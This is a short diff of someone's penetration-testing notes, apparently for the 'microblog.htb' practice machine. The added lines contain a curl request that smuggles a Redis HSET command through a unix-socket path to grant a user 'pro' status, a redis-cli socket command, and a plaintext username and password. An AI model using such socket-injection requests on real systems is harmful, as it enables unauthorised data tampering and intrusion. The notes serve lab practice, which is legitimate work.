@@ -34,3 +34,10 @@ port 3000 : gitea 1.17.3
 
 bulletproof seems to be vulnerable
 we can see a subdomaine sunny that have edit
+
+curl -X HSET http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:mateor%20pro%20true%20/HTTP/1.1 
+
+redis-cli -s /var/run/redis/redis.sock
+cooper:zooperdoopercooper
+
+
